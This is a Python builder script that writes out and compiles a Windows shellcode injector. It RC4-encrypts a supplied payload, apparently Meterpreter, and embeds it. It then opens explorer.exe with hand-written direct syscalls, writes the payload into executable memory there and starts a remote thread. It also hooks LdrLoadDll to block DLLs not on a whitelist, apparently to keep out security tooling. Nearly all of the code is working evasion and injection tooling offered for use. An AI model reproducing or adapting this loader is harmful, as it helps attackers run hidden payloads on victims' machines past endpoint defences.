import os
import sys
import subprocess

def clean():
	os.remove("main.c")
	os.remove("main.h")
	os.remove("Makefile")
	os.remove("syscalls.asm")
	os.remove("encmeter.bin")
	os.rename(sys.argv[1] + ".bin", sys.argv[1])
	os.remove("syscalls.lib")
	

def writemake():
	makefile = open("Makefile", "w+")
	makefile.write('''CC=x86_64-w64-mingw32-gcc
ASM_CC=nasm

OUTFILE=defensiveinjector.exe

all: syscalls injector

syscalls:
	$(ASM_CC) -f win64 syscalls.asm -o syscalls.lib

injector:
	$(CC) main.c -o $(OUTFILE) -L./ -lsyscalls''')
	makefile.close()

def writeasm(build):
	if (build == "2004"):
		version = "0xc1"
	else:
		version = "0xbd"
	mainasm = open("syscalls.asm", "w+")
	mainasm.write('''section .text

global NtOpenProcess
global NtCreateThreadEx
global NtWriteVirtualMemory
global NtAllocateVirtualMemory

NtOpenProcess:
	mov r10, rcx
	mov eax, 26h
	syscall
	ret

NtCreateThreadEx:
	mov r10, rcx
	mov eax, ''' + version + '''
	syscall
	ret

NtWriteVirtualMemory:
	mov r10, rcx
	mov eax, 3Ah
	syscall
	ret

NtAllocateVirtualMemory:
	mov r10, rcx
	mov eax, 18h
	syscall
	ret''')
	mainasm.close()

def writec(result, password):
	mainc = open("main.c", "w+")
	mainc.write('''#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <ntdef.h>
#include <winternl.h>

#include "main.h"

''' + result + '''
NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress)
{
    INT i;
    DWORD dwOldProtect;
    BOOL bAllow = FALSE;
    DWORD dwbytesWritten;
    CHAR cDllName[MAX_PATH];

    // change to a char
    sprintf(cDllName, "%S", DllName->Buffer);

    for (i = 0; i < dwAllowDllCount; i++)
    {
        // is it on the whitelist
        if (strcmp(cDllName, cAllowDlls[i]) == 0)
        {
            bAllow = TRUE;

            printf("Allowing DLL: %s\\n", cDllName);

            // repatch LdrLoadDll and call it
            VirtualProtect(lpAddr, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &dwOldProtect);
            memcpy(lpAddr, OriginalBytes, sizeof(OriginalBytes));
            VirtualProtect(lpAddr, sizeof(OriginalBytes), dwOldProtect, &dwOldProtect);

            LdrLoadDll_ LdrLoadDll = (LdrLoadDll_)GetProcAddress(LoadLibrary("ntdll.dll"), "LdrLoadDll");

            LdrLoadDll(SearchPath, DllCharacteristics, DllName, BaseAddress);

            // then hook it again
            HookLoadDll(lpAddr);
        }

    }

    if (!bAllow)
    {
        printf("Blocked DLL: %s\\n", cDllName);
    }

    return TRUE;
}

VOID HookLoadDll(LPVOID lpAddr)
{
    DWORD oldProtect, oldOldProtect;
    void *hLdrLoadDll = &_LdrLoadDll;

    // our trampoline
    unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };

    // add in the address of our hook
    *(void **)(boing + 2) = &_LdrLoadDll;

    // write the hook
    VirtualProtect(lpAddr, 13, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(lpAddr, boing, sizeof(boing));
    VirtualProtect(lpAddr, 13, oldProtect, &oldProtect);

    return;
}

BOOL DecryptShellcode()
{
    BOOL bSuccess = TRUE;

    HCRYPTKEY hCryptoKey;
    HCRYPTHASH hCryptHash;
    HCRYPTPROV hCryptoProv;

    BYTE* pbKey = "''' + password + '''";
    DWORD dwLen = strlen(pbKey);

    // get the crypto context
    bSuccess = fnCryptAcquireContextW(&hCryptoProv, NULL, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (!bSuccess)
    {
        printf("CryptAcquireContextW\\n");
        goto CLEANUP;
    }

    // init an create the hashing handle
    bSuccess = fnCryptCreateHash(hCryptoProv, CALG_SHA_256, 0, 0, &hCryptHash);
    if (!bSuccess)
    {
        printf("CryptCreateHash\\n");
        goto CLEANUP;
    }

    // add the key to the hash object
    bSuccess = fnCryptHashData(hCryptHash, pbKey, dwLen, 0);
    if (!bSuccess)
    {
        printf("CryptHashData\\n");
        goto CLEANUP;
    }

    // gen the session keys from the hash
    bSuccess = fnCryptDeriveKey(hCryptoProv, CALG_RC4, hCryptHash, 0,&hCryptoKey);
    if (!bSuccess)
    {
        printf("CryptDeriveKey\\n");
        goto CLEANUP;
    }

    // decrypt the buffer
    bSuccess = fnCryptDecrypt(hCryptoKey, NULL, FALSE, 0, (BYTE*)encmeter_bin, &encmeter_bin_len);
    if (!bSuccess)
    {
        printf("CryptDecrypt: %d\\n", GetLastError());
        goto CLEANUP;
    }

    goto CLEANUP;

    CLEANUP:
        fnCryptReleaseContext(hCryptoProv, 0);
        fnCryptDestroyKey(hCryptoKey);
        fnCryptDestroyHash(hCryptHash);

        return bSuccess;
}

DWORD FindExplorer()
{
    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // take snapshot
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapshot)
    {
        // enum the processes found
        if(Process32First(hSnapshot, &pe32))
        {
            do
            {
                // check if its explorer, if it is then give the pid
                if (strcmp(pe32.szExeFile, "explorer.exe") == 0)
                {
                    return pe32.th32ProcessID;
                }
            } while(Process32Next(hSnapshot, &pe32));
            CloseHandle(hSnapshot);
        }
    }

    return -1;
}

int main(int argc,  char const *argv[])
{
    DWORD dwPid;
    INITIAL_TEB InitTeb;
    LPVOID lpBuffer = NULL;
    CLIENT_ID uPid = { 0 };
    HANDLE hThread, hProcess;
    OBJECT_ATTRIBUTES ObjectAttributes;

    // crypto stuff
    fnCryptAcquireContextW = (CryptAcquireContextW_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptAcquireContextW");
    fnCryptCreateHash = (CryptCreateHash_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptCreateHash");
    fnCryptHashData = (CryptHashData_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptHashData");
    fnCryptDeriveKey = (CryptDeriveKey_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDeriveKey");
    fnCryptDecrypt = (CryptDecrypt_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDecrypt");
    fnCryptReleaseContext = (CryptReleaseContext_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptReleaseContext");
    fnCryptDestroyKey = (CryptDestroyKey_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDestroyKey");
    fnCryptDestroyHash = (CryptDestroyHash_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDestroyHash");

    // decrypt the shellcode
    if (!DecryptShellcode())
    {
        printf("[!] Failed to decrypt shellcode\\n");
        return -1;
    }

    // get addresss of where the hook should be
    lpAddr = (LPVOID)GetProcAddress(GetModuleHandle("ntdll.dll"), "LdrLoadDll");

    // save the original bytes
    memcpy(OriginalBytes, lpAddr, 13);

    // set the hook
    HookLoadDll(lpAddr);

    // find the pid of explorer.exe
    dwPid = FindExplorer();
    if (dwPid == -1)
    {
        printf("[!] Failed to find process\\n");
        return -1;
    }

    // set the pid to get a handle to
    uPid.UniqueProcess = (HANDLE)dwPid;
    uPid.UniqueThread = NULL;

    // get a handle on the process
    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);

    // alloc memory
    NtAllocateVirtualMemory(hProcess, &lpBuffer, 0, &encmeter_bin_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // write the shellcode to the process
    NtWriteVirtualMemory(hProcess, lpBuffer, encmeter_bin, encmeter_bin_len, NULL);

    // start the shellcode
    NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (hThread == INVALID_HANDLE_VALUE)
    {
        printf("[!] Failed to inject shellcode\\n");
        return -1;
    }

    printf("[+] Successfully injected shellcode\\n");

    return 0;
}
''')
	mainc.close()

def writeh():
	mainh = open("main.h", "w+")
	mainh.write('''#define dwAllowDllCount 4
CHAR cAllowDlls[dwAllowDllCount][MAX_PATH] = {
                                                "W:\\\\allowed.dll",
                                                "C:\\\\Windows\\\\system32\\\\rsaenh.dll",
                                                "C:\\\\Windows\\\\system32\\\\bcryptprimitives.dll",
                                                "ext-ms-win-kernel32-errorhandling-l1-1-0.dll"
                                             };

VOID HookLoadDll(LPVOID lpAddr);
NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress);

typedef void (WINAPI * LdrLoadDll_) (PWSTR SearchPath OPTIONAL,
                                     PULONG DllCharacteristics OPTIONAL,
                                     PUNICODE_STRING DllName,
                                     PVOID *BaseAddress);

LPVOID lpAddr;
CHAR OriginalBytes[13] = {};

 typedef struct _INITIAL_TEB
 {
     PVOID PreviousStackBase;
     PVOID PreviousStackLimit;
     PVOID StackBase;
     PVOID StackLimit;
     PVOID AllocatedStackBase;
 } INITIAL_TEB, *PINITIAL_TEB;

typedef BOOL (WINAPI * CryptDestroyKey_)      (HCRYPTKEY hKey);
typedef BOOL (WINAPI * CryptDestroyHash_)     (HCRYPTHASH hHash);
typedef BOOL (WINAPI * CryptReleaseContext_)  (HCRYPTPROV hProv, DWORD dwFlags);
typedef BOOL (WINAPI * CryptHashData_)        (HCRYPTHASH hHash, const BYTE *pbData, DWORD dwDataLen, DWORD dwFlags);
typedef BOOL (WINAPI * CryptCreateHash_)      (HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
typedef BOOL (WINAPI * CryptDeriveKey_)       (HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY *phKey);
typedef BOOL (WINAPI * CryptDecrypt_)         (HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
typedef BOOL (WINAPI * CryptAcquireContextW_) (HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);

CryptDecrypt_         fnCryptDecrypt;
CryptHashData_        fnCryptHashData;
CryptDeriveKey_       fnCryptDeriveKey;
CryptDestroyKey_      fnCryptDestroyKey;
CryptCreateHash_      fnCryptCreateHash;
CryptDestroyHash_     fnCryptDestroyHash;
CryptReleaseContext_  fnCryptReleaseContext;
CryptAcquireContextW_ fnCryptAcquireContextW;
''')
	mainh.close()


os.rename(sys.argv[1], sys.argv[1] + ".bin")
os.system("cat " + sys.argv[1] + ".bin | openssl enc -rc4 -nosalt -k \"" + sys.argv[2] + "\" > encmeter.bin")
result = subprocess.run(['xxd', '-i', 'encmeter.bin'], stdout=subprocess.PIPE).stdout.decode('utf-8')
print(result)
writeh()
writec(result, sys.argv[2])
writeasm(sys.argv[3])
writemake()
os.system("make")
clean()
print("\nDone!\n")
